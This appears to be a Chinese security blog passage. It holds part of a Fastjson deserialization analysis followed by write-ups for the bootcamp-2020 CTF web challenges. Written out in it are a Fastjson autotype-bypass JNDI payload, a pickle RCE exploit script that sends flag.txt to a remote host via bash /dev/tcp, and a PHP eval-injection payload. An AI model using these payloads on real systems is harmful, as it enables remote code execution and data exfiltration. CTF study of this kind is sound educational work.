class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap<span class="class">.<span class="keyword">class</span> &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>针对deserializers.findClass,这里类中有一个初始方法，在deserializers里面预先填充了一些类与其反序列化器的实例。</p><p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/1.PNG" alt><br>其中包括一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.deserializers.put(Class<span class="class">.<span class="keyword">class</span>, <span class="title">MiscCodec</span>.<span class="title">instance</span>)</span>;</span><br></pre></td></tr></table></figure><p>重点在经过autotype检查后MiscCodec这个反序列化器是怎么处理Class.class的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>TypeUtils.loadClass</code>非常好用.他将使用ClassLoader.loadClass或Class.forName来载入类，在这一过程中，涉及到了mappings的操作,即调用了<code>mappings.put(className,clazz)</code>.那么这样的话会直接将载入后的对象填入mappings。</p><p>那么只要提前将恶意类载入mappings就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Exploit\",\"autoCommit\": true&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootcamp-2020&amp;&amp;mctf-2020</title>
      <link href="2020/10/05/bootcamp-2020&amp;mctf-2020/"/>
      <url>2020/10/05/bootcamp-2020&amp;mctf-2020/</url>
      
        <content type="html"><![CDATA[<p>  国庆放假一直在刷题,大概是因为国赛自己打的太烂了吧…..感觉有不少东西还是可以精进的。</p><a id="more"></a><p>  然后头几天怼了下htb的几道challenge.一个做了很久的题终于怼出来了,还有一道新题卡住了,另一道难题以为有了突破结果发现源码改了。。。。。。于是这两天就打了下ctftime上的两个ctf放松下。 bootcamp-2020是b01lers办的新手赛还是比较简单的,就是lua那题我怎么也没想到它websocket端口是对外的。另一个m*ctf2020挺有意思，难度有点高。而且其中除了web这个分类还有专门一个反序列化分类，比较有趣。目前他们都已经开放仓库，感兴趣的也可以去看看 :)<br><a href="https://github.com/b01lers/bootcamp-2020" target="_blank" rel="noopener">https://github.com/b01lers/bootcamp-2020</a></p><p><a href="https://gitlab.com/mctf/quals-2020" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020</a></p><h2 id="bootcampCTF-2020"><a href="#bootcampCTF-2020" class="headerlink" title="bootcampCTF-2020"></a>bootcampCTF-2020</h2><p>做题时简单做的笔记。所以没图。将就看吧</p><h3 id="Find-That-Data"><a href="#Find-That-Data" class="headerlink" title="Find That Data!"></a>Find That Data!</h3><p>整体上是个静态功能。首先登陆界面js中提示存在<code>/maze</code>路由。接下来发现maze.js中定义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_data</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x === <span class="number">1</span> &amp;&amp; y === maxRows) &#123;</span><br><span class="line">    $.post(<span class="string">"/mem"</span>, &#123; <span class="attr">token</span>: $(<span class="string">"#token"</span>).html() &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">      alert(<span class="string">"Memory: "</span> + data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post<code>/mem</code>传递<code>token=xxx</code>即可。token通过访问<code>/token</code>即可获得。大概几秒刷新一次。</p><h3 id="Programs-Only"><a href="#Programs-Only" class="headerlink" title="Programs Only"></a>Programs Only</h3><p>实话说真的脑洞。要不是因为想起来国际赛经常有这种python后端放robots.txt的操作我真搞不出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Program</span><br><span class="line">Allow: &#x2F;program&#x2F;</span><br><span class="line"></span><br><span class="line">User-agent: Master Control Program 0000</span><br><span class="line">Allow: &#x2F;program&#x2F;control</span><br></pre></td></tr></table></figure><p>改UA访问后一个即可</p><h3 id="Reindeer-Flotilla"><a href="#Reindeer-Flotilla" class="headerlink" title="Reindeer Flotilla"></a>Reindeer Flotilla</h3><p>flag在加了混淆的js里</p><h3 id="First-Day-Inspection"><a href="#First-Day-Inspection" class="headerlink" title="First Day Inspection"></a>First Day Inspection</h3><p>flag一部分在加了混淆的js里剩下的四处找找就完了。</p><h3 id="EnFlaskCom"><a href="#EnFlaskCom" class="headerlink" title="EnFlaskCom"></a>EnFlaskCom</h3><p>有点意思。给了两个cookie.一个cookie user明显是pickle序列化数据的16进制。不过另一个cookie signature只能看出是256位。不知道算法。</p><p>存在报错，那么可以简单尝试更换cookie爆出部分源码。</p><p>于是疯狂fuzz.开始只单纯更改cookie的数值话，触发报错只能得到部分语句。就是知道他会调用自定义的<code>sign()</code>函数计算user的签名并与cookie中的signature进行assert断言。那么显然需要报错带出sign这个函数的源码。</p><p>显然我们只是更改cookie的值的话,传递结果总是字符串。那么sign函数是不会报错的，自然就不会爆出源码。<br>故将cookie改为数组传递下。就能得到sign源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(msg) <span class="keyword">is</span> <span class="keyword">not</span> bytes:</span><br><span class="line">        msg = bytes(msg, <span class="string">'utf8'</span>)</span><br><span class="line">        keyPair = RSA.RsaKey(n=<span class="number">122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027</span>, e=<span class="number">65537</span>, d=<span class="number">51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601</span>, p=<span class="number">9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843</span>, q=<span class="number">12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089</span>, u=<span class="number">3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156</span>)</span><br><span class="line">        signer = pkcs1_15.new(keyPair)</span><br><span class="line">        hsh = SHA384.new()</span><br><span class="line">        hsh.update(msg)</span><br><span class="line">        signature = signer.sign(hsh)</span><br><span class="line">        <span class="keyword">return</span> signature</span><br></pre></td></tr></table></figure><p>进而调用pickle RCE即可.本来不想rce的结果发现<code>is_admin()</code>返回True没改成。干脆就直接rce了<br><code>nc -lvkp 9001</code>监听<br>然后<code>bash -c &quot; cat flag.txt &gt; /dev/tcp/ip/port&quot;</code>即可。避免弹shell造成干扰。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA384</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(msg) <span class="keyword">is</span> <span class="keyword">not</span> bytes:</span><br><span class="line">        msg = bytes(msg, <span class="string">'utf8'</span>)</span><br><span class="line">        keyPair = RSA.RsaKey(n=<span class="number">122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027</span>, e=<span class="number">65537</span>, d=<span class="number">51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601</span>, p=<span class="number">9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843</span>, q=<span class="number">12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089</span>, u=<span class="number">3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156</span>)</span><br><span class="line">        signer = pkcs1_15.new(keyPair)</span><br><span class="line">        hsh = SHA384.new()</span><br><span class="line">        hsh.update(msg)</span><br><span class="line">        signature = signer.sign(hsh)</span><br><span class="line">        <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""bash -c "cat flag.txt &gt; /dev/tcp/xxx/9001" """</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">user=binascii.hexlify(pickle.dumps(e)).decode()</span><br><span class="line">signature=binascii.hexlify(sign(user)).decode()</span><br><span class="line">r = requests.get(<span class="string">'http://chal.ctf.b01lers.com:3000/flag'</span>,cookies=&#123;<span class="string">'user'</span>:user,<span class="string">'signature'</span>:signature&#125;)</span><br></pre></td></tr></table></figure><p>端口即可拿到flag</p><h3 id="Where’s-Tron"><a href="#Where’s-Tron" class="headerlink" title="Where’s Tron?"></a>Where’s Tron?</h3><p>给了源码<br>可以任意sql select语句执行。它唯一的限制就是<code>limit 20</code>所以直接注释掉。在返回的几千条数据中直接找tron。它的某一个列中就是flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> programs <span class="keyword">where</span> <span class="keyword">name</span> regexp <span class="string">"^Tron"</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Next-Gen-Networking"><a href="#Next-Gen-Networking" class="headerlink" title="Next Gen Networking"></a>Next Gen Networking</h3><p>给了源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">"packet"</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: packet not found&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $raw_packet = $_POST[<span class="string">"packet"</span>];</span><br><span class="line">        $packet = json_decode($raw_packet);</span><br><span class="line">        <span class="keyword">if</span>($packet == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: decoding packet&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;version != <span class="number">6.5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: wrong packet version&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + <span class="number">64</span>;</span><br><span class="line">        $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));</span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ihl != $calculated_ihl <span class="keyword">or</span> $packet-&gt;ihl &gt; <span class="number">170</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: wrong header size&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;len != strlen($raw_packet)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: mismatched packet size&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ttl - <span class="number">1</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: invalid ttl&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;ackno != $_COOKIE[<span class="string">"seqno"</span>] + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: out of order packet&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;algo != <span class="string">"sha256"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $checksum_str = <span class="string">"\$checksum = hash(\"$packet-&gt;algo\", strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));"</span>;</span><br><span class="line">        <span class="keyword">eval</span>($checksum_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($packet-&gt;checksum != $checksum) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;p&gt;Error: checksums don't match&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $file_name_hash = hash(<span class="string">"md5"</span>, microtime());</span><br><span class="line">        $file_name = <span class="string">"sent/"</span>.$file_name_hash.<span class="string">".packet"</span>;</span><br><span class="line">        $packet_file = fopen($file_name, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open packet file"</span>);</span><br><span class="line">        fwrite($packet_file, $packet-&gt;data);</span><br><span class="line">        fclose($packet_file);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\""</span>.$file_name.<span class="string">"\"&gt;"</span>.$file_name_hash.<span class="string">".packet&lt;/a&gt;&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Send Packet.&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/style.css"</span>/&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/tron.css"</span>/&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id=<span class="string">"main-wrapper"</span>&gt;</span><br><span class="line">            &lt;div class="content-page"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> <span class="keyword">echo</span> get_data(); <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>主要就是一个eval可以利用。然后用弱类型绕过属性的要求rce<br>如下:</p><ul><li><code>1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0</code>成立。<br>poc<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$raw_packet = <span class="string">'&#123;"version":6.5,"len":110&#125;'</span>;</span><br><span class="line">$packet=json_decode($raw_packet,<span class="keyword">true</span>);</span><br><span class="line">$packet[<span class="string">"version"</span>] = <span class="number">6.5</span>;</span><br><span class="line">$packet[<span class="string">"ttl"</span>]=<span class="string">"1));?&gt;&lt;?php system('cat /var/www/tron-eval/packets/sent/flag.packet.php');//"</span>;</span><br><span class="line">$packet[<span class="string">"seqno"</span>]=<span class="number">0</span>;</span><br><span class="line">$packet[<span class="string">"ackno"</span>]=<span class="number">1</span>;</span><br><span class="line">$packet[<span class="string">"algo"</span>]=<span class="string">"sha256"</span>;</span><br><span class="line">$calculated_ihl = strlen($packet[<span class="string">"version"</span>]) + strlen(strval($packet[<span class="string">"len"</span>])) + strlen(strval($packet[<span class="string">"ttl"</span>])) + strlen(strval($packet[<span class="string">"seqno"</span>])) + strlen(strval($packet[<span class="string">"ackno"</span>])) + strlen($packet[<span class="string">"algo"</span>]) + <span class="number">64</span>;</span><br><span class="line">$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));</span><br><span class="line">$packet[<span class="string">"ihl"</span>]=$calculated_ihl;</span><br><span class="line">$packet[<span class="string">"len"</span>]=strlen(json_encode($packet));</span><br><span class="line">var_dump(json_encode($packet));</span><br></pre></td></tr></table></figure>exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://chal.ctf.b01lers.com:3002/packets/send.php'</span></span><br><span class="line">payload=<span class="string">"""&#123;"version":6.5,"len":164,"ttl":"1));?&gt;&lt;?php system('cat \/var\/www\/tron-eval\/packets\/sent\/flag.packet.php');\/\/","seqno":0,"ackno":1,"algo":"sha256","ihl":157&#125;"""</span></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">'packet'</span>:payload&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></li></ul><h3 id="Derezzy"><a href="#Derezzy" class="headerlink" title="Derezzy"></a>Derezzy</h3><p>有点可惜。其实确实不难的。主要还是没想到它的websocket端口是对外的,有些郁闷。</p><p>首先题目整体上似乎是一个播放功能。然后可用的内容不多。只有一个main.js,用js-beautifyer美化下后看看其中的关键代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateServer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.post(<span class="string">"update"</span>, &#123;</span><br><span class="line">        request: <span class="string">"listen"</span>,</span><br><span class="line">        path: <span class="string">"# wait where were my non-dynamic files..../app.lua"</span></span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="string">"success"</span> == b ? <span class="built_in">console</span>.log(<span class="string">"successful update"</span>) : <span class="built_in">console</span>.log(<span class="string">"unsuccessful update"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得知了update路由与传递的某个参数path提示我们有app.lua.因为是non-dynamic所以就是static静态了。static下有一个files文件夹。可以在里面找到<code>app.lua</code>.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">      update = <span class="string">"/update"</span></span><br><span class="line">    &#125;] = respond_to(&#123;</span><br><span class="line">      GET = <span class="function"><span class="keyword">function</span><span class="params">(self)</span></span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          render = <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">end</span>,</span><br><span class="line">      POST = <span class="function"><span class="keyword">function</span><span class="params">(self)</span></span></span><br><span class="line">        <span class="keyword">if</span> self.POST.request == <span class="string">'listen'</span> <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">if</span> <span class="keyword">not</span> (self.session.id) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              <span class="keyword">local</span> listener = Listens:<span class="built_in">find</span>(csrf.generate_token(self))</span><br><span class="line">              <span class="keyword">if</span> listener <span class="keyword">then</span></span><br><span class="line">                self.session.id = listener.id</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                listener = Listens:<span class="built_in">create</span>(&#123;</span><br><span class="line">                  id = csrf.generate_token(self),</span><br><span class="line">                  count = <span class="number">0</span></span><br><span class="line">                &#125;)</span><br><span class="line">                self.session.id = listener.id</span><br><span class="line">              <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">if</span> self.session.id <span class="keyword">and</span> <span class="keyword">not</span> Listens:<span class="built_in">find</span>(self.session.id) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> listener = Listens:<span class="built_in">create</span>(&#123;</span><br><span class="line">              id = csrf.generate_token(self),</span><br><span class="line">              count = <span class="number">0</span></span><br><span class="line">            &#125;)</span><br><span class="line">            self.session.id = listener.id</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> listener = Listens:<span class="built_in">find</span>(self.session.id)</span><br><span class="line">          <span class="keyword">local</span> data = <span class="string">"flag&#123;........&#125;"</span></span><br><span class="line">          <span class="keyword">if</span> listener.count &gt;= <span class="number">3470</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> ws = w.new_from_uri(<span class="string">"ws://localhost:8181"</span>)</span><br><span class="line">            <span class="built_in">assert</span>(ws:connect())</span><br><span class="line">            data = &#123;</span><br><span class="line">              user = self.session.id,</span><br><span class="line">              count = listener.count</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">assert</span>(ws:send(cjson.encode(data)))</span><br><span class="line">            data = cjson.decode(<span class="built_in">assert</span>(ws:receive()))</span><br><span class="line">            <span class="built_in">assert</span>(ws:<span class="built_in">close</span>())</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> utct</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">local</span> _accum_0 = &#123; &#125;</span><br><span class="line">            <span class="keyword">local</span> _len_0 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">string</span>.<span class="built_in">gmatch</span>(listener.updated_at, <span class="string">"%d+"</span>) <span class="keyword">do</span></span><br><span class="line">              _accum_0[_len_0] = item</span><br><span class="line">              _len_0 = _len_0 + <span class="number">1</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            utct = _accum_0</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> updatetime = <span class="built_in">os</span>.<span 